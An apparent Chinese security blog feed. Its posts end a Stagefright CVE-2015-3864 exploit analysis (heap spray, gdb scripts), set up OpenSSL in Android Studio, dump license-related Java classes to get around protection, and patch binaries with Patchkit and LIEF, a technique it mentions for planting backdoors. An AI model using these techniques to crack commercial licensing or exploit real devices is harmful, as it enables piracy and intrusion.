<p>我们现在能够修改对象的 虚表指针，并且能够触发虚函数调用。我们需要在一个可预测的内存地址精准的布置我们的数据，然后把虚表指针修改到这里，在 <code>exploit</code> 中使用了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">spray_size = 0x100000</div><div class="line">spray_count = 0x10</div><div class="line"></div><div class="line">sample_table(heap_spray(spray_size) * spray_count)</div></pre></td></tr></table></figure></p>
<p>来进行堆喷射 </p>
<p><code>heap_spray</code> 函数 就是使用 <code>pssh</code> 来喷射的内存。每次分配 <code>0x100</code> 页，共分配了 <code>0x10</code> 次。 <code>exploit</code> 作者在 博客中写道，这样就可以在可预测的内存地址中定位到特定数据。在这里就是 用于 <code>stack_pivot</code> 的 <code>gadget</code>.</p>
<p>对于这一点，我很疑惑，<strong>有大佬可以告诉我为什么可以这样吗？ 或者有没有相关的 <code>paper</code> 来介绍为什么可以在 可预测的地址 精确的布置我们的数据</strong></p>
<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>这个 <code>exploit</code> 写的确实强悍，提示我在进行漏洞利用时，要关注各种可能分配内存的地方，灵活的使用代码中的内存分配，来布局内存。 同时研究一个漏洞要把相关知识给补齐。对于这个漏洞就是 <code>MPEG4</code> 的文件格式和 相关的处理代码了。</p>
<p>一些tips：</p>
<ul>
<li>使用 <code>gef</code> + <code>gdb-multiarch</code> 来调试 , <code>pwndbg</code> 我用着非常卡， <code>gef</code> 就不会</li>
<li>调试过程尽量使用脚本减少重复工作量。</li>
</ul>
<p>使用的一些脚本。</p>
<p>使用 <code>gdbserver attach mediaserver</code> 并转发端口的脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">adb root</div><div class="line">adb forward tcp:1234 tcp:1234</div><div class="line">a=`adb shell &quot;ps | grep mediaserver&quot; |  awk &apos;&#123;printf $2&#125;&apos;`</div><div class="line">echo $a</div><div class="line">adb shell &quot;gdbserver --attach :1234 $a&quot;</div></pre></td></tr></table></figure>
<p><code>gdb</code> 的调试脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">set arch armv5</div><div class="line">gef-remote 127.0.0.1:1234</div><div class="line">set solib-search-path debug_so/</div><div class="line">directory android-5.1.0_r3/</div><div class="line">gef config context.layout &quot;regs -source&quot;</div><div class="line">set logging file log.txt</div><div class="line">set logging on</div><div class="line">break frameworks/av/media/libstagefright/MPEG4Extractor.cpp:1897 </div><div class="line">break frameworks/av/media/libstagefright/MPEG4Extractor.cpp:1630</div><div class="line">break frameworks/av/media/libstagefright/MPEG4Extractor.cpp:1647</div><div class="line">break frameworks/av/media/libstagefright/MPEG4Extractor.cpp:884</div><div class="line">commands 1</div><div class="line">p chunk_size</div><div class="line">p buffer</div><div class="line">c</div><div class="line">end</div><div class="line"></div><div class="line">commands 2</div><div class="line">p buffer</div><div class="line"></div><div class="line">end</div><div class="line"></div><div class="line">commands 3</div><div class="line">p buffer</div><div class="line">c</div><div class="line">end</div><div class="line"></div><div class="line">commands 4</div><div class="line">hexdump dword  mDataSource 0x4</div><div class="line">c</div><div class="line">end</div></pre></td></tr></table></figure>
<p>参考：</p>
<p><a href="https://census-labs.com/media/shadow-infiltrate-2017.pdf" target="_blank" rel="external">https://census-labs.com/media/shadow-infiltrate-2017.pdf</a></p>
<p><a href="https://googleprojectzero.blogspot.hk/" target="_blank" rel="external">https://googleprojectzero.blogspot.hk/</a></p>
<p><a href="http://blog.csdn.net/zhuweigangzwg/article/details/17222951" target="_blank" rel="external">http://blog.csdn.net/zhuweigangzwg/article/details/17222951</a></p>
]]></content>
      
        <categories>
            
            <category> 安卓安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CVE-2015-3864 </tag>
            
            <tag> 文件格式漏洞 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[android studio使用openssl]]></title>
      <url>/2017/11/19/android_studio_use_openssl.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>逆向的基础是开发， 逆向分析时很多时候会使用一些公开的加密函数来对数据进行加密，通过使用 <code>openssl</code> 熟悉下。</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>首先得先编译出来 <code>openssl</code>，然后把它们复制到你的工程目录下。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15110733397054zqc1idw.png?imageslim" alt="paste image"></p>
<p><code>include</code> 是 <code>openssl</code> 的头文件。<code>lib</code> 下的那些是编译出来的so。</p>
<p>然后修改 <code>build.gradle</code> 中的 <code>cmake</code> 项：</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1511073468721ci33oo8v.png?imageslim" alt="paste image"></p>
<p><code>cppFlags</code> 是编译选项， <code>abiFilters</code>指定编译so的 <code>abi</code>，和 刚才 <code>lib</code> 目录中的目录项对应。后面会用到。</p>
<p>增加 <img src="http://oy9h5q2k4.bkt.clouddn.com/1511073600119rzvpfdcl.png?imageslim" alt="paste image"></p>
<p><code>jniLibs.srcDirs</code> 的值为<code>openssl</code> so的目录。表示打包时直接复制这些就行了。<br>最终的 <code>build.gradle</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line">apply plugin: &apos;com.android.application&apos;</div><div class="line"></div><div class="line">android &#123;</div><div class="line">    compileSdkVersion 26</div><div class="line">    defaultConfig &#123;</div><div class="line">        applicationId &quot;com.example.administrator.oi&quot;</div><div class="line">        minSdkVersion 19</div><div class="line">        targetSdkVersion 26</div><div class="line">        versionCode 1</div><div class="line">        versionName &quot;1.0&quot;</div><div class="line">        testInstrumentationRunner &quot;android.support.test.runner.AndroidJUnitRunner&quot;</div><div class="line">        externalNativeBuild &#123;</div><div class="line">            cmake &#123;</div><div class="line">                cppFlags &quot;-std=c++11 -frtti -fexceptions&quot;</div><div class="line">                abiFilters &apos;armeabi&apos;, &apos;armeabi-v7a&apos;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    buildTypes &#123;</div><div class="line">        release &#123;</div><div class="line">            minifyEnabled false</div><div class="line">            proguardFiles getDefaultProguardFile(&apos;proguard-android.txt&apos;), &apos;proguard-rules.pro&apos;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    sourceSets &#123;</div><div class="line">        main &#123;</div><div class="line">            jniLibs.srcDirs = [&quot;C:\\Users\\Administrator\\AndroidStudioProjects\\oi\\app\\openssl_resouce\\lib&quot;]</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    externalNativeBuild &#123;</div><div class="line">        cmake &#123;</div><div class="line">            path &quot;CMakeLists.txt&quot;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">dependencies &#123;</div><div class="line">    implementation fileTree(dir: &apos;libs&apos;, include: [&apos;*.jar&apos;])</div><div class="line">    implementation &apos;com.android.support:appcompat-v7:26.1.0&apos;</div><div class="line">    implementation &apos;com.android.support.constraint:constraint-layout:1.0.2&apos;</div><div class="line">    testImplementation &apos;junit:junit:4.12&apos;</div><div class="line">    androidTestImplementation &apos;com.android.support.test:runner:1.0.1&apos;</div><div class="line">    androidTestImplementation &apos;com.android.support.test.espresso:espresso-core:3.0.1&apos;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>然后修改 <code>CMakeLists.txt</code>， 中文注释的地方就是修改的地方。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div></pre></td><td class="code"><pre><div class="line"># For more information about using CMake with Android Studio, read the</div><div class="line"># documentation: https://d.android.com/studio/projects/add-native-code.html</div><div class="line"></div><div class="line"># Sets the minimum version of CMake required to build the native library.</div><div class="line"></div><div class="line">cmake_minimum_required(VERSION 3.4.1)</div><div class="line"></div><div class="line"># 设置头文件加载的目录</div><div class="line">include_directories(C:/Users/Administrator/AndroidStudioProjects/oi/app/openssl_resouce/include)</div><div class="line"></div><div class="line"></div><div class="line">#动态方式加载</div><div class="line">add_library(openssl SHARED IMPORTED )</div><div class="line">add_library(ssl SHARED IMPORTED )</div><div class="line"></div><div class="line">#引入第三方.so库，根据$&#123;ANDROID_ABI&#125; 引用不同的库</div><div class="line">set_target_properties(openssl PROPERTIES IMPORTED_LOCATION C:/Users/Administrator/AndroidStudioProjects/oi/app/openssl_resouce/lib/$&#123;ANDROID_ABI&#125;/libcrypto.so)</div><div class="line">set_target_properties(ssl PROPERTIES IMPORTED_LOCATION C:/Users/Administrator/AndroidStudioProjects/oi/app/openssl_resouce/lib/$&#123;ANDROID_ABI&#125;/libssl.so)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"># Creates and names a library, sets it as either STATIC</div><div class="line"># or SHARED, and provides the relative paths to its source code.</div><div class="line"># You can define multiple libraries, and CMake builds them for you.</div><div class="line"># Gradle automatically packages shared libraries with your APK.</div><div class="line"></div><div class="line">add_library( # Sets the name of the library.</div><div class="line">             native-lib</div><div class="line"></div><div class="line">             # Sets the library as a shared library.</div><div class="line">             SHARED</div><div class="line"></div><div class="line">             # Provides a relative path to your source file(s).</div><div class="line">             src/main/cpp/native-lib.cpp )</div><div class="line"></div><div class="line"># Searches for a specified prebuilt library and stores the path as a</div><div class="line"># variable. Because CMake includes system libraries in the search path by</div><div class="line"># default, you only need to specify the name of the public NDK library</div><div class="line"># you want to add. CMake verifies that the library exists before</div><div class="line"># completing its build.</div><div class="line"></div><div class="line">find_library( # Sets the name of the path variable.</div><div class="line">              log-lib</div><div class="line"></div><div class="line">              # Specifies the name of the NDK library that</div><div class="line">              # you want CMake to locate.</div><div class="line">              log )</div><div class="line"></div><div class="line"># Specifies libraries CMake should link to your target library. You</div><div class="line"># can link multiple libraries, such as libraries you define in this</div><div class="line"># build script, prebuilt third-party libraries, or system libraries.</div><div class="line"></div><div class="line"># 设置链接选项</div><div class="line">target_link_libraries( # Specifies the target library.</div><div class="line">                       native-lib</div><div class="line">                       openssl</div><div class="line">                       ssl</div><div class="line"></div><div class="line">                       # Links the target library to the log library</div><div class="line">                       # included in the NDK.</div><div class="line">                       $&#123;log-lib&#125; )</div></pre></td></tr></table></figure>
<p>然后就可以使用了。</p>
<p>项目路径</p>
<p><a href="https://gitee.com/hac425/android_openssl/" target="_blank" rel="external">https://gitee.com/hac425/android_openssl/</a></p>
]]></content>
      
        <categories>
            
            <category> 安卓安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> openssl </tag>
            
            <tag> 开发 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[使用sa-jdi.jar dump 内存中的class]]></title>
      <url>/2017/11/17/use_sa_jdi_jar_dump_class.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在分析一个 <code>jar</code> 包时发现他把关键类采用了运行时使用 <code>classloader</code> 的方式加载了。懒得分析算法了，可以使用 <code>jdk</code> 自带的工具 <code>dump</code> 出需要的<code>class</code>.</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>从运行的java进程里dump出运行中的类的class文件的方法，所知道的有两种</p>
<ul>
<li><p>用agent attatch 到进程，然后利用 Instrumentation和 ClassFileTransformer就可以获取 到类的字节码了。</p>
</li>
<li><p>使用 sd-jdi.jar里的工具</p>
</li>
</ul>
<p>本文介绍的就是使用 <code>sd-jdi.jar</code> 来dump.  <code>sd-jdi.jar</code>里自带的的 <code>sun.jvm.hotspot.tools.jcore.ClassDump</code> 可以把类的class内容dump到文件里。</p>
<p><code>ClassDump</code> 里可以设置两个 <code>System properties</code>：</p>
<ul>
<li>sun.jvm.hotspot.tools.jcore.filter  Filter的类名</li>
<li>sun.jvm.hotspot.tools.jcore.outputDir 输出的目录</li>
</ul>
<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>首先写一个 <code>filter</code> 类</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">import sun.jvm.hotspot.tools.jcore.ClassFilter;</div><div class="line">import sun.jvm.hotspot.oops.InstanceKlass;</div><div class="line">import sun.jvm.hotspot.tools.jcore.ClassDump;</div><div class="line">public class MyFilter implements ClassFilter &#123;</div><div class="line">    @Override</div><div class="line">    public boolean canInclude(InstanceKlass kls) &#123;</div><div class="line">        String klassName = kls.getName().asString();</div><div class="line">        return klassName.startsWith(&quot;com/fr/license/selector/&quot;);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>代码很显而易见了， 作用是 <code>dump</code> 所有 以 <code>com/fr/license/selector/</code> 开头的 类的· 字节码。</p>
<p>然后编译成class文件</p>
<p>要使用这个首先需要把  <code>sa-jdi.jar</code> 加到 <code>java</code> 的 <code>classpath</code> 里。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1510917062153e72v6rn3.png?imageslim" alt="paste image"></p>
<p>进入 刚刚写的 <code>filter</code> 类的class文件的目录下。执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">java  -Dsun.jvm.hotspot.tools.jcore.filter=MyFilter  -Dsun.jvm.hotspot.tools.jcore.outputDir=d:\dump  sun.jvm.hotspot.tools.jcore.ClassDump 5308</div></pre></td></tr></table></figure>
<p>把<code>MyFilter</code> 改为你自己的类名， <code>5308</code> 为目标 java进程的 <code>pid</code>(可以使用 <code>jps</code> 查看）。然后就会在 <code>d:\dump</code> 产生相应的 <code>class</code> 文件。</p>
<h3 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h3><ul>
<li><p>如果直接点击应用的 exe, 来启动应用，使用 jps 获取到的 pid， 可能没有办法附加， 所以我们要找到启动的命令， 比如 bat脚本里面。</p>
</li>
<li><p>一般大型应用会自带 jre, 我们要使用上面的技术，替换 jre,为我们的，才能正常dump, 否则会出现版本不匹配。</p>
</li>
<li>windows下还需把 <code>sawindbg.dll</code> 放到 <code>jre/bin/</code> 和java.exe 同目录下。否则可能会遇到 加载不了这个 dll 的问题。</li>
</ul>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1510919261728mq8ffmr8.png?imageslim" alt="paste image"></p>
<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>搞java应用第一步还是找到启动的命令，便于后面的分析。一般别使用 <code>exe</code>启动应用</p>
]]></content>
      
        <categories>
            
            <category> java应用破解思路 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> dump class </tag>
            
            <tag> sa-jdi.jar </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[可执行文件patch技术&&持续更新]]></title>
      <url>/2017/11/07/patch_file_methods.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在ctf比赛中， 有时我们需要对可执行文件进行patch, 或者在植入后门时，patch也是常用的手段。不过手工patch比较麻烦，下面介绍几个工具。本文介绍遇到的各种技术，不断更新。</p>
<h3 id="ELF"><a href="#ELF" class="headerlink" title="ELF"></a>ELF</h3><h4 id="Patchkit"><a href="#Patchkit" class="headerlink" title="Patchkit"></a>Patchkit</h4><p>地址：<br><a href="https://github.com/lunixbochs/patchkit.git" target="_blank" rel="external">https://github.com/lunixbochs/patchkit.git</a></p>
<p>1.由于链接器的原因暂时还不能使用 libc 中的函数，所以所有要做的事情都需要我们自己实现。用 c 或者 asm</p>
<ul>
<li><code>pt.patch(addr,jmp=jmp_addr)</code>  用于修改程序流程。</li>
<li><code>pt.hook(addr, target)</code> 用于劫持程序流程，进行参数过滤。</li>
</ul>
<p>使用方式：<code>./patch binary_file patch.py</code></p>
<p>过滤printf中 %n 的脚本。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">def replace_free(pt):</div><div class="line">    printf_addr = 0x400548;// call printf 时的地址</div><div class="line">    new_printf = pt.inject(c=r&apos;&apos;&apos;</div><div class="line">void fix_printf(char *fmt) &#123;</div><div class="line">    for (int i = 0; fmt[i]; ++i)</div><div class="line">    &#123;</div><div class="line">        if (fmt[i] == &apos;%&apos; &amp;&amp; fmt[i+1] == &apos;n&apos;) &#123;</div><div class="line">           //找到后，通过前移的方式删除字符，每次删掉一个。</div><div class="line">            int len=0;</div><div class="line">            int j;</div><div class="line">            while(fmt[len++])&#123;</div><div class="line">            &#125;</div><div class="line">            for(j=i;j&lt;len-1;j++)</div><div class="line">                fmt[j] = fmt[j+1];</div><div class="line">            fmt[len-1] = &apos;\x00&apos;;</div><div class="line">            len=0;</div><div class="line">            while(fmt[len++])&#123;</div><div class="line">            &#125;</div><div class="line">            for(j=i;j&lt;len-1;j++)</div><div class="line">                fmt[j] = fmt[j+1];</div><div class="line">            </div><div class="line">            fmt[len-1] = &apos;\x00&apos;;</div><div class="line">            //i--;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"> </div><div class="line">&#125;</div><div class="line">    &apos;&apos;&apos;)</div><div class="line">    pt.hook(printf_addr, new_printf);</div></pre></td></tr></table></figure>
<p>64位程序，修改 malloc函数的参数为 <code>0x20</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">def replace(pt):</div><div class="line">    malloc_addr = 0x040057A;  //call malloc的位置</div><div class="line">    new_malloc = pt.inject(asm=r&apos;&apos;&apos;</div><div class="line">    mov rdi,0x20</div><div class="line">    ret</div><div class="line">    &apos;&apos;&apos;)</div><div class="line">    pt.hook(malloc_addr, new_malloc);</div></pre></td></tr></table></figure></p>
<p>32位，由于与栈进行操作，要注意保存还原返回地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">def replace(pt):</div><div class="line">    malloc_addr = 0x08048454;</div><div class="line">    new_malloc = pt.inject(asm=r&apos;&apos;&apos;</div><div class="line">    pop eax</div><div class="line">    pop ebx</div><div class="line">    push 0x20</div><div class="line">    push eax</div><div class="line">    ret</div><div class="line">    &apos;&apos;&apos;)</div><div class="line">    pt.hook(malloc_addr,new_malloc);</div></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">def replace(pt):</div><div class="line">    malloc_addr = 0x08048454;</div><div class="line">    new_malloc = pt.inject(asm=r&apos;&apos;&apos;</div><div class="line">    mov eax,0x20</div><div class="line">    mov [esp+4], eax</div><div class="line">    ret</div><div class="line">    &apos;&apos;&apos;)</div><div class="line">    pt.hook(malloc_addr,new_malloc);</div></pre></td></tr></table></figure>
<h4 id="LIEF"><a href="#LIEF" class="headerlink" title="LIEF"></a>LIEF</h4><p>程序地址：<a href="https://github.com/lief-project/LIEF" target="_blank" rel="external">https://github.com/lief-project/LIEF</a></p>
<p>使用这个工具可以很方便的 patch <code>elf</code>， <code>pe</code>，<code>MachO</code> 文件。本文以<code>elf</code>  为例。</p>
<p><strong>通过交换导入导出符号</strong></p>
<p>首先看第一个测试程序：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">int main(int argc, char** argv) &#123;</div><div class="line">  puts(&quot;/bin/sh&quot;);</div><div class="line">  return EXIT_SUCCESS;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>我们的目标是让他调用 <code>puts</code> 变成调用 <code>system</code></p>
<p><strong>方案一</strong></p>
<p>修改 libc 中的相关符号，然后使用 <code>LD_LIBRARY_PATH</code> 加载我们修改后的库。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">import lief</div><div class="line"></div><div class="line">hashme = lief.parse(&quot;hashme&quot;)</div><div class="line">libc = lief.parse(&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;)</div><div class="line"></div><div class="line"># get puts, system symbol</div><div class="line">puts_sym = filter(lambda e: e.name == &quot;puts&quot;, libc.dynamic_symbols)[0]</div><div class="line">system_sym = filter(lambda e: e.name == &quot;system&quot;, libc.dynamic_symbols)[0]</div><div class="line"></div><div class="line"># swap them</div><div class="line">puts_sym.name = &quot;system&quot;</div><div class="line">system_sym.name = &quot;puts&quot;</div><div class="line">libc.write(&quot;libc.so.6&quot;)</div><div class="line"></div><div class="line">print(&quot;done&quot;)</div></pre></td></tr></table></figure>
<p>首先拿到 puts 和 system 符号对象，然后交换他们的名称。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1510064081347di3rwx94.png?imageslim" alt="paste image"><br>成功</p>
<p><strong>方案二</strong></p>
<p>直接修改目标文件的导入符号，代码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">import lief</div><div class="line"></div><div class="line">hashme = lief.parse(&quot;hashme&quot;)</div><div class="line"></div><div class="line"># get puts, system symbol</div><div class="line">puts_sym = filter(lambda e: e.name == &quot;puts&quot;, hashme.imported_symbols)[0]</div><div class="line"></div><div class="line"># set puts to system </div><div class="line">puts_sym.name = &quot;system&quot;</div><div class="line"></div><div class="line">hashme.write(&quot;hashme.patch&quot;)</div><div class="line">print(&quot;done&quot;)</div></pre></td></tr></table></figure>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1510064333755d675x70o.png?imageslim" alt="paste image"></p>
<p><strong>直接增加代码进行patch</strong></p>
<h6 id="修改库函数"><a href="#修改库函数" class="headerlink" title="修改库函数"></a>修改库函数</h6><p>测试程序：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;math.h&gt;</div><div class="line"></div><div class="line">int main(int argc, char **argv) &#123;</div><div class="line">  if (argc != 2) &#123;</div><div class="line">    printf(&quot;Usage: %s &lt;a&gt; \n&quot;, argv[0]);</div><div class="line">    exit(-1);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  int a = atoi(argv[1]);</div><div class="line">  printf(&quot;exp(%d) = %f\n&quot;, a, exp(a));</div><div class="line">  return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>目标是hook <code>exp</code> 函数，直接增加一个 <code>segments</code> , 然后劫持函数指针到这里。首先编译一个 <code>lib</code> 用来提供用于 <code>hook</code> 的代码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc -Os -nostdlib -nodefaultlibs -fPIC -Wl,-shared hook.c -o hook</div></pre></td></tr></table></figure>
<p>hook.c 的内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">double hook(double x) &#123;</div><div class="line">  return x + 100;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>然后看脚本内容，很清晰。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">import lief</div><div class="line"></div><div class="line">libm = lief.parse(&quot;/lib/x86_64-linux-gnu/libm-2.23.so&quot;)</div><div class="line">hook = lief.parse(&quot;hook&quot;)</div><div class="line"></div><div class="line">segment_added = libm.add(hook.segments[0])</div><div class="line"></div><div class="line">print(&quot;Hook inserted at VA: 0x&#123;:06x&#125;&quot;.format(segment_added.virtual_address))</div><div class="line"></div><div class="line">exp_symbol = libm.get_symbol(&quot;exp&quot;)</div><div class="line">hook_symbol = hook.get_symbol(&quot;hook&quot;)</div><div class="line"></div><div class="line">exp_symbol.value = segment_added.virtual_address + hook_symbol.value</div><div class="line"></div><div class="line">libm.write(&quot;libm.so.6&quot;)</div></pre></td></tr></table></figure></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1510065215828nuiov7ys.png?imageslim" alt="paste image"></p>
